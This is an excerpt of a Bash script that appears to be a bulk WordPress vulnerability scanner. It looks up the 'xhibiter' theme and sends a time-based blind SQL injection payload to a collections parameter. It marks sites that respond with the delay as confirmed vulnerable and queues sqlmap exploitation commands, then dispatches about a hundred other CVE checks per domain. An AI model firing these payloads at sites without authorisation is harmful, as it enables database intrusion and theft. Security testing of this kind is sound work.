...
_check_xhibiter_nft_sqli() {
    local BASE_URL="$1" DOMAIN="$2"
    echo -e "\n${YELLOW}[xhibiter-nft-sqli] theme=xhibiter | GET time-based${NC}"
    [ "${NUCLEI_TRUST:-0}" != "1" ] && {
        local HTTP; HTTP=$(curl -sk -A "$UA" -o /dev/null -w "%{http_code}" -m "$TIMEOUT" "${BASE_URL}/wp-content/themes/xhibiter/" 2>/dev/null || echo 000)
        [[ "$HTTP" =~ ^[23] ]] || { echo -e "${RED}  Theme not found (HTTP ${HTTP})${NC}"; return; }
    }
    local DUR; DUR=$(time_check "${BASE_URL}/collections?id=2%27+AND+%28SELECT+1492+FROM+%28SELECT%28SLEEP%287%29%29%29HsLV%29+AND+%27KEOa%27%3D%27KEOa" GET "" 7)
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "xhibiter-nft-sqli" "CONFIRMED" "GET time-based sleep=${DUR}s" "sqli"
        add_sqlmap "# xhibiter-nft-sqli: sqlmap -u '${BASE_URL}/collections?id=1' --technique=T --dbms=MySQL --batch"
    else
        log_safe "$DOMAIN" "xhibiter-nft-sqli" "no delay (${DUR}s)"
    fi
}
...
validate_domain() {
    ...
    if [ -n "$CVE_HINT" ]; then
        ...
        *xhibiter-nft-sqli*) _check_xhibiter_nft_sqli "$BASE_URL" "$DOMAIN" ;;
    ...
    _check_cve_2021_24400 "$BASE_URL" "$DOMAIN"
    _check_cve_2021_24402 "$BASE_URL" "$DOMAIN"
    _check_cve_2021_24457 "$BASE_URL" "$DOMAIN"
    _check_cve_2021_24575 "$BASE_URL" "$DOMAIN"
    _check_cve_2021_24662 "$BASE_URL" "$DOMAIN"
    _check_cve_2021_24741 "$BASE_URL" "$DOMAIN"
    _check_cve_2021_24858 "$BASE_URL" "$DOMAIN"
    _check_cve_2021_24863 "$BASE_URL" "$DOMAIN"
    _check_cve_2021_24952 "$BASE_URL" "$DOMAIN"
    _check_cve_2021_25023 "$BASE_URL" "$DOMAIN"
    _check_cve_2022_0478 "$BASE_URL" "$DOMAIN"
    _check_cve_2022_0657 "$BASE_URL" "$DOMAIN"
    _check_cve_2022_23911 "$BASE_URL" "$DOMAIN"
    _check_cve_2022_2593 "$BASE_URL" "$DOMAIN"
    _check_cve_2022_29410 "$BASE_URL" "$DOMAIN"
    _check_cve_2022_3141 "$BASE_URL" "$DOMAIN"
    _check_cve_2022_3494 "$BASE_URL" "$DOMAIN"
    _check_cve_2022_3720 "$BASE_URL" "$DOMAIN"
    _check_cve_2022_4351 "$BASE_URL" "$DOMAIN"
    _check_cve_2022_4359 "$BASE_URL" "$DOMAIN"
    _check_cve_2022_4370 "$BASE_URL" "$DOMAIN"
    _check_cve_2022_45373 "$BASE_URL" "$DOMAIN"
    _check_cve_2022_4546 "$BASE_URL" "$DOMAIN"
    _check_cve_2022_45820 "$BASE_URL" "$DOMAIN"
    _check_cve_2022_47426 "$BASE_URL" "$DOMAIN"
    _check_cve_2023_0262 "$BASE_URL" "$DOMAIN"
    _check_cve_2023_0277 "$BASE_URL" "$DOMAIN"
    _check_cve_2023_0487 "$BASE_URL" "$DOMAIN"
    _check_cve_2023_26325 "$BASE_URL" "$DOMAIN"
    _check_cve_2023_28659 "$BASE_URL" "$DOMAIN"
    _check_cve_2023_29432 "$BASE_URL" "$DOMAIN"
    _check_cve_2023_3416 "$BASE_URL" "$DOMAIN"
    _check_cve_2023_34179 "$BASE_URL" "$DOMAIN"
    _check_cve_2023_3435 "$BASE_URL" "$DOMAIN"
    _check_cve_2023_34383 "$BASE_URL" "$DOMAIN"
    _check_cve_2023_35879 "$BASE_URL" "$DOMAIN"
    _check_cve_2023_40010 "$BASE_URL" "$DOMAIN"
    _check_cve_2023_45657 "$BASE_URL" "$DOMAIN"
    _check_cve_2023_49752 "$BASE_URL" "$DOMAIN"
    _check_cve_2023_50851 "$BASE_URL" "$DOMAIN"
    _check_cve_2023_50853 "$BASE_URL" "$DOMAIN"
    _check_cve_2023_50855 "$BASE_URL" "$DOMAIN"
    _check_cve_2023_5108 "$BASE_URL" "$DOMAIN"
    _check_cve_2023_52135 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_0709 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_0956 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_10499 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_10570 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_10862 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_11912 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_1207 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_12157 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_13184 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_13475 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_13479 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_13481 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_13483 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_13712 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_1990 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_2386 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_30242 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_31356 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_32134 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_33559 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_3820 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_38708 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_4145 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_49621 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_49655 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_54280 "$BASE_URL" "$DOMAIN"
    _check_cve_2024_56039 "$BASE_URL" "$DOMAIN"
    _check_cve_2025_12166 "$BASE_URL" "$DOMAIN"
    _check_cve_2025_13126 "$BASE_URL" "$DOMAIN"
    _check_cve_2025_2317 "$BASE_URL" "$DOMAIN"
    _check_cve_2025_23993 "$BASE_URL" "$DOMAIN"
    _check_cve_2025_24759 "$BASE_URL" "$DOMAIN"
    _check_cve_2025_26943 "$BASE_URL" "$DOMAIN"
    _check_cve_2025_31056 "$BASE_URL" "$DOMAIN"
    _check_cve_2025_31534 "$BASE_URL" "$DOMAIN"
    _check_cve_2025_31553 "$BASE_URL" "$DOMAIN"
    _check_cve_2025_31599 "$BASE_URL" "$DOMAIN"
    _check_cve_2025_32547 "$BASE_URL" "$DOMAIN"
    _check_cve_2025_52773 "$BASE_URL" "$DOMAIN"
    _check_cve_2025_52829 "$BASE_URL" "$DOMAIN"
    _check_cve_2025_52830 "$BASE_URL" "$DOMAIN"
    _check_cve_2025_69338 "$BASE_URL" "$DOMAIN"
    _check_cve_2025_69366 "$BASE_URL" "$DOMAIN"
    _check_cve_2025_9200 "$BASE_URL" "$DOMAIN"
    _check_cve_2025_9807 "$BASE_URL" "$DOMAIN"
    _check_cve_2026_22484 "$BASE_URL" "$DOMAIN"
    _check_cve_2026_2416 "$BASE_URL" "$DOMAIN"
    _check_cve_2026_24959 "$BASE_URL" "$DOMAIN"
    ...
    _check_xhibiter_nft_sqli "$BASE_URL" "$DOMAIN"
    fi
}
